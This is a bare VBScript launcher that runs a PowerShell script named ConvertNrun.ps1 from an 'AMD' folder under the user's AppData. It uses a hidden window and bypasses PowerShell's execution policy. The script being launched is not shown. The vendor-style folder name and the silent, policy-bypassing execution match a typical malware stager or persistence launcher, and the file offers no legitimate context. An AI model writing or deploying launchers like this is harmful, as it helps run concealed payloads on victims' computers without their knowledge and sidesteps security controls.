Set objShell = CreateObject("WScript.Shell")
appDataPath = objShell.ExpandEnvironmentStrings("%APPDATA%")
scriptPath = appDataPath & "\AMD\ConvertNrun.ps1"
objShell.Run "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File """ & scriptPath & """", 0, False
Set objShell = Nothing
